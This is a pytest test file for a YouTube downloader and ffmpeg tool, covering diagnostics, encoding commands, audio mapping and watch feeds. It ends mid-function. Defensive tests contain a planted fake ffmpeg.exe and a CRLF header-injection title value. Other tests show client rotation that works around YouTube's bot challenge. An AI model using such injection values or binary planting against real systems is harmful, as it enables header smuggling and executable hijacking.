def test_diagnose_fails_installed_dependency_below_floor(monkeypatch):
    """Diagnose must fail locally when an installed distribution is below its declared floor."""
    import yt_final

    class FakeDetector:
        ffmpeg_path = "ffmpeg"
        gpu_info = {"working_encoders": []}

    monkeypatch.setattr(
        yt_final.UpdateChecker,
        "_installed",
        staticmethod(lambda name: "2026.6.9" if name == "yt-dlp" else "99.0"),
    )
    rows = yt_final.build_diagnose_result(detector=FakeDetector())
    row = next(item for item in rows if item["name"] == "yt-dlp")
    assert row["status"] == "fail"
    assert "requires >=2026.7.4" in row["detail"]


def test_diagnose_rejects_relative_ffmpeg_even_when_which_finds_cwd_poison(
        monkeypatch, tmp_path):
    """Diagnostics must not report an implicitly discovered executable as trusted."""
    from Final import yt_final as Y

    poisoned = tmp_path / 'download-folder'
    poisoned.mkdir()
    poison_ffmpeg = poisoned / 'ffmpeg.exe'
    poison_ffprobe = poisoned / 'ffprobe.exe'
    poison_ffmpeg.write_bytes(b'poison')
    poison_ffprobe.write_bytes(b'poison')
    monkeypatch.chdir(poisoned)
    monkeypatch.setattr(
        Y.shutil,
        'which',
        lambda name: str(poisoned / f'{name}.exe'),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_installed',
        staticmethod(lambda _name: '9999.0.0'),
    )

    class Detector:
        ffmpeg_path = 'ffmpeg'
        gpu_info = {'working_encoders': []}

    rows = Y.build_diagnose_result(Detector(), check_pypi=False)

    assert next(row for row in rows if row['name'] == 'ffmpeg')['status'] == 'fail'
    assert next(row for row in rows if row['name'] == 'ffprobe')['status'] == 'fail'


def test_diagnose_accepts_real_absolute_ffmpeg_pair(monkeypatch, tmp_path):
    """An explicit sibling pair remains reportable without PATH discovery."""
    from Final import yt_final as Y

    ffmpeg = tmp_path / 'tools' / 'ffmpeg.exe'
    ffprobe = ffmpeg.with_name('ffprobe.exe')
    ffmpeg.parent.mkdir()
    ffmpeg.write_bytes(b'ffmpeg')
    ffprobe.write_bytes(b'ffprobe')
    monkeypatch.setattr(
        Y.shutil,
        'which',
        lambda *_args, **_kwargs: pytest.fail('diagnose consulted PATH'),
    )
    monkeypatch.setattr(
        Y.UpdateChecker,
        '_installed',
        staticmethod(lambda _name: '9999.0.0'),
    )

    class Detector:
        ffmpeg_path = str(ffmpeg)
        gpu_info = {
            'ffmpeg_version': 'ffmpeg version test',
            'working_encoders': [],
        }

    rows = Y.build_diagnose_result(Detector(), check_pypi=False)

    assert next(row for row in rows if row['name'] == 'ffmpeg')['status'] == 'pass'
    probe_row = next(row for row in rows if row['name'] == 'ffprobe')
    assert probe_row['status'] == 'pass'
    assert probe_row['detail'] == str(ffprobe.resolve())


def test_pot_mode_lazy_stage1_android_vr_no_mweb_provider_wired():
    """Opt-in lazy mode: stage-1 client list is android_vr-first with NO mweb (so no PO fetch is paid),
    while only an explicitly reachable HTTP provider may stay wired for retry."""
    from Final.yt_final import YouTubeDownloader, CapabilityDetector
    dl = YouTubeDownloader(CapabilityDetector(), out_dir='.', pot_mode='lazy')
    dl._pot_provider_status = lambda: (
        'script',
        '/x/bgutil/server/build/generate_once.js',
    )
    ea = {'youtube': {}}
    dl._apply_pot_mode(ea)
    clients = ea['youtube']['player_client']
    assert clients[0] == 'android_vr' and 'mweb' not in clients   # no PO client -> no PO fetch (~2.8s saved)
    assert ea['youtubepot-bgutilhttp'] == {'base_url': [dl._DISABLED_URL]}
    assert ea['youtubepot-bgutilscript'] == {
        'script_path': [dl._DISABLED_SCRIPT],
    }
    source = Path(__file__).with_name('yt_final.py').resolve()
    assert source in Path(dl._DISABLED_SCRIPT).parents
    assert source.is_file()
    print('test_pot_mode_lazy_stage1_android_vr_no_mweb_provider_wired passed')


def test_pot_mode_lazy_escalates_to_po_only_when_useful():
    """A PO-fixable failure (no-format/403/degradation) on the android_vr stage escalates ONCE to the
    full mweb+PO client list. It does NOT escalate a second time, when no provider exists, in 'auto'
    mode, or on a bot challenge (which the tuned is_bot branch handles)."""
    from Final.yt_final import YouTubeDownloader, CapabilityDetector
    def mk(mode, provider=('http', 'http://127.0.0.1:4416')):
        dl = YouTubeDownloader(CapabilityDetector(), out_dir='.', pot_mode=mode)
        dl._pot_provider_status = lambda: provider
        return dl
    base = lambda: {'extractor_args': {'youtube': {'player_client': ['android_vr', 'web_safari']}},
                    'progress_hooks': []}

    # lazy + provider + no-format failure -> escalate to mweb+PO (flag set only by the lazy branch)
    out = mk('lazy')._next_opts_on_error(Exception('Requested format is not available'), 0, base())
    assert out.get('_engine_po_escalated') is True
    assert 'mweb' in out['extractor_args']['youtube']['player_client']

    # already escalated -> the lazy branch is guarded off, so it must NOT re-swap the client list to
    # the PO set (input carries a sentinel client + the flag; lazy would overwrite it if it fired).
    already = {'extractor_args': {'youtube': {'player_client': ['SENTINEL_KEEP']}},
               'progress_hooks': [], '_engine_po_escalated': True}
    out2 = mk('lazy')._next_opts_on_error(Exception('Requested format is not available'), 1, already)
    assert not (out2 and out2['extractor_args']['youtube']['player_client'] == list(mk('lazy').CLIENTS_WITH_POT))

    # no provider -> lazy does NOT escalate (would just burn an attempt)
    outnp = mk('lazy', provider=(None, 'none'))._next_opts_on_error(Exception('Requested format is not available'), 0, base())
    assert not (outnp and outnp.get('_engine_po_escalated'))

    # default 'auto' mode is untouched — never lazy-escalates
    outauto = mk('auto')._next_opts_on_error(Exception('Requested format is not available'), 0, base())
    assert not (outauto and outauto.get('_engine_po_escalated'))

    # a bot challenge is left to the tuned is_bot branch (embedded rotation), not the lazy PO swap
    outbot = mk('lazy')._next_opts_on_error(Exception('Please sign in to confirm you are not a bot'), 0, base())
    assert 'tv_embedded' in outbot['extractor_args']['youtube']['player_client']
    assert not outbot.get('_engine_po_escalated')
    print('test_pot_mode_lazy_escalates_to_po_only_when_useful passed')


def test_diagnose_reports_http_transport_row(monkeypatch):
    """P1c: diagnose surfaces the pooled-vs-urllib transport, so a runtime that silently fell back to
    the unpooled handler is visible with an actionable fix instead of reporting 'all pass'."""
    from Final import yt_final as Y
    rows = Y.build_diagnose_result(CapabilityDetector(), check_pypi=False)
    trow = next(r for r in rows if r['name'] == 'HTTP transport')
    assert trow['status'] == ('pass' if Y._pooled_transport_available() else 'warn')
    # Force the missing-transport branch -> warn + a fix that points at requests/urllib3
    monkeypatch.setattr(Y, '_pooled_transport_available', lambda: False)
    t2 = next(r for r in Y.build_diagnose_result(CapabilityDetector(), check_pypi=False)
              if r['name'] == 'HTTP transport')
    assert t2['status'] == 'warn' and 'requests' in t2['fix'].lower() and t2['fix']
    print('test_diagnose_reports_http_transport_row passed')


def test_diagnose_exit_code_logic():
    """run_diagnose returns 0/1 and equals 1 iff any row is 'fail' (validated against the builder)."""
    from Final.yt_final import build_diagnose_result, run_diagnose
    rows = build_diagnose_result(CapabilityDetector(), check_pypi=False)
    expected = 1 if any(r['status'] == 'fail' for r in rows) else 0
    rc = run_diagnose(CapabilityDetector(), check_pypi=False)
    assert rc in (0, 1) and rc == expected
    print('test_diagnose_exit_code_logic passed')


def test_diagnose_no_crash_tools_absent():
    """With every binary stubbed absent, the builder stays well-formed and run_diagnose returns 1."""
    import shutil
    from Final import yt_final as Y
    orig_which = shutil.which
    try:
        Y.shutil.which = lambda *a, **k: None
        det = CapabilityDetector()
        det.ffmpeg_path = '__no_such_ffmpeg__'
        rows = Y.build_diagnose_result(det, check_pypi=False)
        assert isinstance(rows, list) and rows
        for r in rows:
            assert set(r.keys()) == {'name', 'status', 'detail', 'fix'}
            assert r['status'] in {'pass', 'warn', 'fail'}
        assert any(r['status'] == 'fail' for r in rows)  # ffmpeg/ffprobe/yt-dlp/JS-runtime hard-missing
        assert Y.run_diagnose(det, check_pypi=False) == 1
    finally:
        Y.shutil.which = orig_which
    print('test_diagnose_no_crash_tools_absent passed')


def test_parse_section():
    # Classmethod — no detector required
    P = YouTubeDownloader._parse_section
    assert P('0:00-2:00') == (0.0, 120.0)
    assert P('90-210') == (90.0, 210.0)
    assert P('1:00:00-1:02:00') == (3600.0, 3720.0)
    assert P(' 1:30 - 3:00 ') == (90.0, 180.0)
    assert P('1:30–3:00') == (90.0, 180.0)  # en-dash
    assert P('1:30—3:00') == (90.0, 180.0)  # em-dash
    assert P('1:30 to 3:00') == (90.0, 180.0)
    assert P('-2:00') == (0.0, 120.0)
    assert P('bad') is None
    assert P('2:00-1:00') is None  # end <= start
    assert P('1:30') is None
    assert P('1:99-3:00') is None  # invalid seconds component
    assert YouTubeDownloader.format_section_range('1:30-3:00')
    print('test_parse_section passed')


def test_jobspec_roundtrip_and_args():
    from Final.jobspec import JobSpec
    s = JobSpec.from_dict({'url': 'https://youtu.be/x', 'quality': '4k', 'two_pass': 'true',
                           'loudnorm': '-14', 'sub_langs': 'en, es', 'workers': '3', 'bogus': 'ignore'})
    assert s.urls == ['https://youtu.be/x'] and s.quality == '4k'
    assert s.two_pass is True and s.loudnorm == -14.0 and s.sub_langs == ['en', 'es'] and s.workers == 3
    assert JobSpec.from_dict(s.to_dict()).to_dict() == s.to_dict()  # round-trip
    # defaults reproduce legacy behaviour
    d = JobSpec(urls=['u'])
    assert d.quality == '1080p' and d.encode_mode == 'copy' and d.chapters is True and d.embed_metadata is True
    # merged overlay
    m = d.merged(quality='720p', codec=None)
    assert m.quality == '720p' and m.codec is None
    print('test_jobspec_roundtrip_and_args passed')


def test_config_warnings_surface_unimplemented_a7_knobs():
    """two_pass / video bitrate are accepted-but-not-yet-honored (A7 reserved). The contract must
    warn instead of silently no-oping a single-pass encode."""
    from Final.jobspec import JobSpec
    w = JobSpec.from_dict({'url': 'https://youtu.be/x', 'two_pass': 'true'}).config_warnings()
    assert len(w) == 1 and 'two_pass' in w[0] and 'single-pass' in w[0]
    wb = JobSpec.from_dict({'url': 'https://youtu.be/x', 'bitrate': '12M'}).config_warnings()
    assert len(wb) == 1 and '12M' in wb[0]
    both = JobSpec.from_dict({'url': 'u', 'two_pass': True, 'bitrate': '8M'}).config_warnings()
    assert len(both) == 2
    # default job: nothing accepted-but-unhonored -> no warnings
    assert JobSpec.from_dict({'url': 'https://youtu.be/x'}).config_warnings() == []
    assert JobSpec(urls=['u']).config_warnings() == []
    print('test_config_warnings_surface_unimplemented_a7_knobs passed')


def test_download_then_process_is_adapter():
    """K1: the legacy 13-arg method must still exist and route through run()."""
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    eng = FinalYouTubeGPUEngine(output_dir='.')
    captured = {}
    eng.run = lambda spec: captured.setdefault('spec', spec) or []
    eng.download_then_process('https://youtu.be/x', quality='4k', encode_mode='reencode', profile='prores_hq')
    sp = captured['spec']
    assert isinstance(sp, JobSpec) and sp.urls == ['https://youtu.be/x']
    assert sp.quality == '4k' and sp.encode_mode == 'reencode' and sp.profile == 'prores_hq'
    print('test_download_then_process_is_adapter passed')


def test_build_command_k3_channels():
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    s = ' '.join(proc.build_ffmpeg_command('in.mp4', 'out.mp4', 'premiere_h264_cpu',
                metadata={'title': 'Hi', 'artist': 'A'}, vf_extra='scale=1280:720',
                overrides={'audio_codec': 'flac'}))
    assert '-vf scale=1280:720' in s and '-metadata title=Hi' in s and '-c:a flac' in s
    # flac must NOT get a bitrate
    assert '-b:a' not in s.split('-c:a flac')[1]
    # ffmetadata channel adds 2nd input + map flags, and suppresses -metadata flags
    s2 = ' '.join(proc.build_ffmpeg_command('in.mp4', 'out.mp4', 'copy_fast',
                  ffmetadata_file='m.ffmeta', metadata={'title': 'X'}))
    assert '-i m.ffmeta' in s2 and '-map_metadata 1' in s2 and '-map_chapters 1' in s2
    assert '-metadata title=X' not in s2
    # legacy call unchanged (copy_fast targets mp4 -> +faststart, as it always has)
    assert proc.build_ffmpeg_command('in.mp4', 'out.mp4', 'copy_fast') == \
           [proc.ffmpeg, '-hide_banner', '-y', '-i', 'in.mp4', '-c', 'copy',
            '-movflags', '+faststart', '-fflags', '+genpts', 'out.mp4']
    print('test_build_command_k3_channels passed')


def test_new_2026_profiles_build():
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    for k in ('cpu_av1_svt_filmgrain', 'nvenc_av1_vbr', 'prores_lt', 'prores_4444', 'dnxhd_hq_1080p25'):
        assert k in proc.profiles, k
    assert 'film-grain=8' in ' '.join(proc.build_ffmpeg_command('i', 'o.mkv', 'cpu_av1_svt_filmgrain'))
    av1vbr = ' '.join(proc.build_ffmpeg_command('i', 'o.mp4', 'nvenc_av1_vbr'))
    assert 'av1_nvenc' in av1vbr and '-cq 30' in av1vbr and '-b:v 12M' in av1vbr
    dn = ' '.join(proc.build_ffmpeg_command('i', 'o.mov', 'dnxhd_hq_1080p25'))
    assert '-b:v 185M' in dn and 'scale=1920:1080,fps=25' in dn
    assert '-profile:v 4' in ' '.join(proc.build_ffmpeg_command('i', 'o.mov', 'prores_4444'))
    print('test_new_2026_profiles_build passed')


def test_sdr_color_args_tags_untagged():
    """Untagged (or 'unknown') SDR source -> stamp Rec.709 on all three axes."""
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    proc.probe_color = lambda s: {}
    assert proc.sdr_color_args('in.mp4') == \
        ['-color_primaries', 'bt709', '-color_trc', 'bt709', '-colorspace', 'bt709']
    proc.probe_color = lambda s: {'color_primaries': 'unknown',
                                  'color_transfer': 'unknown', 'color_space': 'unknown'}
    assert proc.sdr_color_args('in.mp4') == \
        ['-color_primaries', 'bt709', '-color_trc', 'bt709', '-colorspace', 'bt709']
    print('test_sdr_color_args_tags_untagged passed')


def test_sdr_color_args_respects_existing():
    """A real tag is never overridden; only the missing axes get filled."""
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    proc.probe_color = lambda s: {'color_primaries': 'bt709',
                                  'color_transfer': 'bt709', 'color_space': 'bt709'}
    assert proc.sdr_color_args('in.mp4') == []
    # partial: only color_space present -> only the two missing flags emitted
    proc.probe_color = lambda s: {'color_space': 'bt709'}
    out = proc.sdr_color_args('in.mp4')
    assert out == ['-color_primaries', 'bt709', '-color_trc', 'bt709']
    assert '-colorspace' not in out
    print('test_sdr_color_args_respects_existing passed')


def test_sdr_color_args_hdr_untouched():
    """HDR (PQ/HLG/BT.2020) sources are owned by hdr_color_args -> sdr returns []."""
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    proc.probe_color = lambda s: {'color_transfer': 'smpte2084', 'color_primaries': 'bt2020'}
    assert proc.sdr_color_args('in.mp4') == []
    proc.probe_color = lambda s: {'color_transfer': 'arib-std-b67'}
    assert proc.sdr_color_args('in.mp4') == []
    print('test_sdr_color_args_hdr_untouched passed')


def test_color_tag_flows_to_extra_out_args():
    """The _extra_out_args escape hatch carries the bt709 flags through build_ffmpeg_command,
    for both a re-encode MP4 profile and a ProRes/MOV profile (which writes the 'colr' atom)."""
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    proc.probe_color = lambda s: {}
    flags = proc.sdr_color_args('in.mp4')
    s = ' '.join(proc.build_ffmpeg_command('in.mp4', 'out.mp4', 'premiere_h264_cpu',
                                           overrides={'_extra_out_args': flags}))
    assert '-color_primaries bt709' in s and '-color_trc bt709' in s and '-colorspace bt709' in s
    s2 = ' '.join(proc.build_ffmpeg_command('in.mp4', 'out.mov', 'prores_hq',
                                            overrides={'_extra_out_args': flags}))
    assert '-color_primaries bt709' in s2 and '-color_trc bt709' in s2 and '-colorspace bt709' in s2
    print('test_color_tag_flows_to_extra_out_args passed')


def test_color_tag_jobspec_roundtrip():
    """color_tag field: default 'auto', accepts 'off', coerces junk to 'auto', round-trips."""
    from Final.jobspec import JobSpec
    assert JobSpec(urls=['u']).color_tag == 'auto'
    assert JobSpec.from_dict({'color_tag': 'off'}).color_tag == 'off'
    assert JobSpec.from_dict({'color_tag': 'bogus'}).color_tag == 'auto'
    sp = JobSpec.from_dict({'color_tag': 'off'})
    assert JobSpec.from_dict(sp.to_dict()).to_dict() == sp.to_dict()
    print('test_color_tag_jobspec_roundtrip passed')


# =========================================================================== #
# Burn-in slate (--burn-in) + dual-mono split (--audio-map)
# =========================================================================== #
def test_burn_in_drawtext_escape():
    """drawtext text escaping: apostrophe, colon, %, comma and graph delimiters must be neutralised."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    out = E._ff_drawtext_escape("It's a: test, [x] 50%")
    # no raw apostrophe/colon/percent/comma/bracket that would break the filtergraph or quoting
    assert "\\'" in out and ':' not in out.replace('\\:', '') and '\\%' in out
    assert '\\,' in out and '\\[' in out and '\\]' in out
    # control whitespace collapses, output is truncated to <=80 visible-ish chars before escaping
    assert E._ff_drawtext_escape("a\nb\tc") == 'a b c'
    print('test_burn_in_drawtext_escape passed')


def test_burn_in_vf_skipped_on_copy():
    """The slate (vf_extra) must NOT appear on a copy profile, and MUST appear on a re-encode one."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    eng = E.__new__(E)                      # no full init needed for the pure vf builder
    slate = eng._burn_in_vf({'title': "Bob's Talk", 'uploader': 'Chan', 'upload_date': '20240131',
                             'webpage_url': 'https://x/y'})
    assert 'drawtext' in slate and 'fontfile=' in slate
    # copy profile: -vf is illegal with -c copy -> slate dropped
    s_copy = ' '.join(proc.build_ffmpeg_command('in.mp4', 'out.mp4', 'copy_fast', vf_extra=slate))
    assert '-vf' not in s_copy and 'drawtext' not in s_copy
    # re-encode CPU profile: slate rides -vf
    s_enc = ' '.join(proc.build_ffmpeg_command('in.mp4', 'out.mp4', 'premiere_h264_cpu', vf_extra=slate))
    assert 'drawtext' in s_enc and 'fontfile=' in s_enc and '-vf' in s_enc
    print('test_burn_in_vf_skipped_on_copy passed')


def test_burn_in_vf_composes_with_subtitles():
    """A subtitle-burn vf_extra and the slate must coexist in a single -vf graph."""
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    from Final.yt_final import FinalYouTubeGPUEngine as E
    eng = E.__new__(E)
    slate = eng._burn_in_vf({'title': 'T'})
    combined = "subtitles='x.srt'," + slate
    s = ' '.join(proc.build_ffmpeg_command('in.mp4', 'out.mp4', 'premiere_h264_cpu', vf_extra=combined))
    assert 'subtitles=' in s and 'drawtext' in s
    # exactly one -vf token
    assert s.count('-vf ') == 1
    print('test_burn_in_vf_composes_with_subtitles passed')


def test_audio_map_dual_mono_args():
    """dual-mono on a MOV profile: channelsplit + L/R maps + the video map + a real audio codec."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    from Final.jobspec import JobSpec
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    eng = E.__new__(E)
    spec = JobSpec.from_dict({'audio_map': 'dual-mono'})
    amap = eng._audio_map_args(spec, '.mov')
    s = ' '.join(proc.build_ffmpeg_command('in.mov', 'out.mov', 'prores_hq',
                                           overrides={'_extra_out_args': amap, 'audio_codec': 'pcm_s24le'}))
    assert 'channelsplit' in s and '-map [L]' in s and '-map [R]' in s and '-map 0:v' in s
    assert '-c:a pcm_s24le' in s
    print('test_audio_map_dual_mono_args passed')


def test_audio_map_coexists_with_color_tag():
    """Rec.709 color flags AND the channelsplit maps must BOTH survive into the command
    (guards the _extra_out_args ordering regression in _finalize)."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    from Final.jobspec import JobSpec
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    eng = E.__new__(E)
    color = ['-color_primaries', 'bt709', '-color_trc', 'bt709', '-colorspace', 'bt709']
    amap = eng._audio_map_args(JobSpec.from_dict({'audio_map': 'split'}), '.mkv')
    s = ' '.join(proc.build_ffmpeg_command('in.mkv', 'out.mkv', 'premiere_h264_cpu',
                                           overrides={'_extra_out_args': color + amap}))
    assert '-color_primaries bt709' in s and '-colorspace bt709' in s
    assert 'channelsplit' in s and '-map [L]' in s
    print('test_audio_map_coexists_with_color_tag passed')


def test_audio_map_gated_to_mov_mkv():
    """_audio_map_args returns [] for mp4 (caller switches container) and the map args for mov/mkv."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    from Final.jobspec import JobSpec
    eng = E.__new__(E)
    spec = JobSpec.from_dict({'audio_map': 'dual-mono'})
    assert eng._audio_map_args(spec, '.mp4') == []
    assert eng._audio_map_args(spec, '.mov')          # non-empty
    assert eng._audio_map_args(spec, '.mkv')
    # stereo passthrough -> no args even on mov
    assert eng._audio_map_args(JobSpec.from_dict({'audio_map': 'stereo'}), '.mov') == []
    print('test_audio_map_gated_to_mov_mkv passed')


def test_audio_map_forces_reencode_and_audio_codec():
    """The _plan_audio_map gate flips copy->reencode, forces a non-copy audio codec, and
    coerces mp4->mkv."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    from Final.jobspec import JobSpec
    spec = JobSpec.from_dict({'audio_map': 'split'})
    mode, ov, ext = E._plan_audio_map(spec, 'copy', {}, '.mp4')
    assert mode == 'reencode' and ov['audio_codec'] == 'pcm_s24le' and ext == '.mkv'
    # an explicit copy audio codec is also upgraded
    mode2, ov2, ext2 = E._plan_audio_map(JobSpec.from_dict({'audio_map': 'split', 'audio_codec': 'copy'}),
                                         'reencode', {'audio_codec': 'copy'}, '.mov')
    assert ov2['audio_codec'] == 'pcm_s24le' and ext2 == '.mov'
    # an explicit real codec is respected
    _, ov3, _ = E._plan_audio_map(JobSpec.from_dict({'audio_map': 'split', 'audio_codec': 'flac'}),
                                  'reencode', {'audio_codec': 'flac'}, '.mkv')
    assert ov3['audio_codec'] == 'flac'
    # no-op when audio_map off
    assert E._plan_audio_map(JobSpec.from_dict({}), 'copy', {}, '.mp4') == ('copy', {}, '.mp4')
    print('test_audio_map_forces_reencode_and_audio_codec passed')


def test_burn_in_audio_map_jobspec_roundtrip():
    """burn_in defaults False; audio_map defaults None; both coerce + round-trip; junk -> None."""
    from Final.jobspec import JobSpec
    assert JobSpec(urls=['u']).burn_in is False
    assert JobSpec(urls=['u']).audio_map is None
    sp = JobSpec.from_dict({'burn_in': 'yes', 'audio_map': 'dual-mono'})
    assert sp.burn_in is True and sp.audio_map == 'dual-mono'
    assert JobSpec.from_dict({'audio_map': 'bogus'}).audio_map is None
    assert JobSpec.from_dict(sp.to_dict()).to_dict() == sp.to_dict()
    print('test_burn_in_audio_map_jobspec_roundtrip passed')


def test_audio_map_folds_vf_into_filter_complex():
    """--audio-map + a -vf (burn-in/subtitle) must merge into ONE filter_complex — ffmpeg rejects
    a simultaneous -vf and -filter_complex (regression for the 10-sonnet H4 finding)."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    from Final.jobspec import JobSpec
    eng = E.__new__(E)
    merged = eng._audio_map_args(JobSpec.from_dict({'audio_map': 'dual-mono'}), '.mov', vf='drawtext=text=hi')
    fc = merged[merged.index('-filter_complex') + 1]
    assert '[0:v]drawtext=text=hi[vout]' in fc and 'channelsplit' in fc, fc
    assert '[vout]' in merged and '0:v' not in merged          # video routed through the graph
    plain = eng._audio_map_args(JobSpec.from_dict({'audio_map': 'dual-mono'}), '.mov')
    assert '0:v' in plain and '[vout]' not in ' '.join(plain)  # no-vf path unchanged
    print('test_audio_map_folds_vf_into_filter_complex passed')


def test_ntfy_title_header_strips_crlf():
    """A CR/LF in a video title must not split/inject the ntfy Title HTTP header."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    _b, hdr = E._build_notify_request('ntfy', {'title': 'Evil\r\nX-Injected: 1', 'ok': True})
    assert '\r' not in hdr['Title'] and '\n' not in hdr['Title'], hdr['Title']
    print('test_ntfy_title_header_strips_crlf passed')


def test_to_vtt_no_zero_length_cue():
    """WEBVTT rejects zero-length cues: an end<=start chapter must get a >=1s cue."""
    from Final.markers import to_vtt
    vtt = to_vtt([{'start_time': 10, 'end_time': 10, 'title': 'x'}])
    assert '00:00:10.000 --> 00:00:10.000' not in vtt
    assert '00:00:10.000 --> 00:00:11.000' in vtt, vtt
    print('test_to_vtt_no_zero_length_cue passed')


def test_watch_after_accepts_iso_date():
    """--after must accept both YYYYMMDD and ISO YYYY-MM-DD (compared on digits only)."""
    from Final import watch as _w
    v = {'title': 'x', 'published': '2026-03-01T00:00:00Z'}
    assert _w.match_filters(v, {'after': '2026-06-01'}, None) is False   # ISO, pre-cutoff -> reject
    assert _w.match_filters(v, {'after': '2026-01-01'}, None) is True    # ISO, post-cutoff -> keep
    assert _w.match_filters(v, {'after': '20260601'}, None) is False     # YYYYMMDD still works
    print('test_watch_after_accepts_iso_date passed')


@pytest.mark.parametrize(
    ("pattern", "message"),
    [
        ("(", "invalid"),
        (r"^(i)\1$", "backreference"),
        (r"^(?P<letter>i)(?P=letter)$", "backreference"),
        (r"^(a)?(?(1)b|c)$", "conditional"),
        ("(?x)^i # comment\n$", "verbose"),
        (r"^(?# comment)i$", "comment"),
        (r"(?V1)^[i]$", "stdlib"),
        (r"^(?:foo){i<=1}$", "extension"),
        ("^a{١}$", "brace"),
        ("^a{１,２}$", "brace"),
        (r"^a{4294967296,}$", "repetition"),
        (r"^[[a-z]--[x]]$", "character-set"),
        (r"^(?>i)$", "atomic"),
        (r"^i++$", "possessive"),
    ],
)
def test_watch_cli_rejects_invalid_pattern_cleanly_before_network(
        monkeypatch, capsys, pattern, message):
    import sys as _sys
    import urllib.request
    import yt_final

    network_calls = []

    def forbidden_network(*args, **kwargs):
        network_calls.append((args, kwargs))
        raise AssertionError("network must not run for an invalid title pattern")

    monkeypatch.setattr(urllib.request, "urlopen", forbidden_network)
    monkeypatch.setattr(
        _sys,
        "argv",
        ["yt_final.py", "watch", "@example", "--filter-title", pattern],
    )

    with pytest.raises(SystemExit) as exc:
        yt_final.main()

    captured = capsys.readouterr()
    assert exc.value.code == 2
    assert message in captured.err.lower()
    assert "traceback" not in captured.err.lower()
    assert network_calls == []


def test_sponsorblock_mark_uses_real_categories():
    """--sponsorblock mark must pass REAL category keys, not the literal 'all' (which yt-dlp's PP
    never expands -> zero segments)."""
    from Final.jobspec import JobSpec
    det = CapabilityDetector(); dl = YouTubeDownloader(det, out_dir='.')
    opts = dl.get_optimized_ydl_opts('1080p', spec=JobSpec(urls=['u'], sponsorblock='mark'))
    sb = [p for p in opts['postprocessors'] if p.get('key') == 'SponsorBlock'][0]
    assert 'all' not in sb['categories'] and 'sponsor' in sb['categories'], sb['categories']
    print('test_sponsorblock_mark_uses_real_categories passed')


def test_plan_audio_map_coerces_any_container():
    """--audio-map needs MOV/MKV: ANY other container (webm/mp4/avi) must be coerced to .mkv, else
    a forced pcm codec lands in an incompatible container and the encode fails."""
    from Final.yt_final import FinalYouTubeGPUEngine as E
    from Final.jobspec import JobSpec
    for ext in ('.webm', '.mp4', '.avi'):
        assert E._plan_audio_map(JobSpec.from_dict({'audio_map': 'split'}), 'copy', {}, ext)[2] == '.mkv', ext
    assert E._plan_audio_map(JobSpec.from_dict({'audio_map': 'split'}), 'copy', {}, '.mov')[2] == '.mov'
    print('test_plan_audio_map_coerces_any_container passed')


def test_fcpxml_escapes_attribute_quotes():
    """A double-quote in a title must be escaped in FCPXML attributes (saxutils.escape omits ")."""
    from Final.markers import to_fcpxml
    import xml.dom.minidom as _md
    fx = to_fcpxml([{'start_time': 0, 'title': 'Say "Hi" & go'}], 25, 10, 'Proj "X"')
    _md.parseString(fx)   # raises if malformed
    assert '&quot;' in fx
    print('test_fcpxml_escapes_attribute_quotes passed')


def test_jobstore_list_returns_copies():
    """jobstore.list() returns COPIES: mutating a returned job (webserver progress injection) must
    not leak into the cache / durable queue.json."""
    import tempfile, os
    from Final.jobstore import DownloadJournal
    from Final.jobspec import JobSpec
    j = DownloadJournal(os.path.join(tempfile.mkdtemp(), 'q.json'))
    j.add(JobSpec(urls=['u']))
    j.list()[0]['progress'] = 99
    assert j.list()[0].get('progress') != 99, 'list() leaked an ephemeral mutation into the cache'
    print('test_jobstore_list_returns_copies passed')


def test_watchstore_dedupes_within_batch():
    """A feed returning the same id twice in one fetch must enqueue it ONCE (no duplicate pending)."""
    import tempfile, os
    from Final.watchstore import WatchStore
    ws = WatchStore(path=os.path.join(tempfile.mkdtemp(), 'w.json'))
    w = ws.add('UC123', label='c', url='https://x', auto_queue=False)
    # Skip first-poll baseline so this poll actually stages pending items.
    ws.update(w['id'], last_checked=1.0)
    fetched = [{'id': 'v1', 'title': 'A', 'url': 'u1'}, {'id': 'v1', 'title': 'A', 'url': 'u1'},
               {'id': 'v2', 'title': 'B', 'url': 'u2'}]
    n, _mode = ws.apply_poll(w['id'], fetched)
    assert n == 2, n
    pend = [p['id'] for p in ws.get(w['id'])['pending']]
    assert pend.count('v1') == 1, pend
    print('test_watchstore_dedupes_within_batch passed')


def test_watchstore_first_poll_baselines_feed():
    """First poll must NOT flood pending with the whole RSS — only future uploads are 'new'."""
    import tempfile, os
    from Final.watchstore import WatchStore
    ws = WatchStore(path=os.path.join(tempfile.mkdtemp(), 'w.json'))
    w = ws.add('UC123', label='c', url='https://x', auto_queue=False)
    feed = [
        {'id': 'new1', 'title': 'Newest', 'url': 'u1', 'published': '2026-07-16T00:00:00+00:00'},
        {'id': 'old1', 'title': 'Older', 'url': 'u2', 'published': '2026-06-01T00:00:00+00:00'},
    ]
    n, mode = ws.apply_poll(w['id'], feed)
    assert mode == 'baseline' and n == 0
    got = ws.get(w['id'])
    assert got['pending'] == []
    assert set(got['seen']) == {'new1', 'old1'}
    # A later poll with a brand-new id stages it at the FRONT of pending.
    n2, mode2 = ws.apply_poll(w['id'], [
        {'id': 'brand', 'title': 'Brand New', 'url': 'ub'},
        {'id': 'new1', 'title': 'Newest', 'url': 'u1'},
        {'id': 'old1', 'title': 'Older', 'url': 'u2'},
    ])
    assert n2 == 1 and mode2 == 'pending'
    pend = ws.get(w['id'])['pending']
    assert [p['id'] for p in pend] == ['brand']
    print('test_watchstore_first_poll_baselines_feed passed')


def test_watchstore_pending_newest_first_and_refresh_titles():
